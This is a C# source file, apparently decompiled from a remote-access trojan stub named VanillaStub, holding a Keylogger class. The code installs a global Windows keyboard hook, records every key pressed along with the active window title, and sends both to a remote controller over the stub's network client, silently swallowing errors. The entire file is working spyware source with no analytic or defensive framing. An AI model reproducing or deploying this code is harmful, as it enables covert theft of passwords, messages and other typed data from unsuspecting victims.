using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using VanillaStub.Helpers.Networking;

namespace VanillaStub.Helpers.Services;

public class Keylogger
{
	public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static readonly LowLevelKeyboardProc Proc = HookCallback;

	private static IntPtr HookID = IntPtr.Zero;

	private static string CurrentWindow = "";

	public static bool SendKeys { private get; set; }

	public void InitKeylogger()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		try
		{
			ApplicationContext val = new ApplicationContext();
			HookID = SetHook(Proc);
			Application.Run(val);
			UnhookWindowsHookEx(HookID);
		}
		catch
		{
		}
	}

	public IntPtr SetHook(LowLevelKeyboardProc Proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, Proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				int num = Marshal.ReadInt32(lParam);
				if (SendKeys)
				{
					List<byte> list = new List<byte>();
					list.Add(11);
					Encoding aSCII = Encoding.ASCII;
					Keys val = (Keys)num;
					list.AddRange(aSCII.GetBytes(((object)(Keys)(ref val)).ToString()));
					VanillaStub.Helpers.Networking.Networking.MainClient.Send(list.ToArray());
					list.Clear();
					CurrentWindow = GetWindowName();
					list.Add(12);
					list.AddRange(Encoding.ASCII.GetBytes(CurrentWindow));
					VanillaStub.Helpers.Networking.Networking.MainClient.Send(list.ToArray());
				}
			}
		}
		catch
		{
		}
		return CallNextHookEx(HookID, nCode, wParam, lParam);
	}

	public static string GetWindowName()
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		IntPtr foregroundWindow = GetForegroundWindow();
		if (GetWindowText(foregroundWindow, stringBuilder, 256) > 0)
		{
			return stringBuilder.ToString();
		}
		return "N/A";
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr GetModuleHandle(string lpModuleName);
}
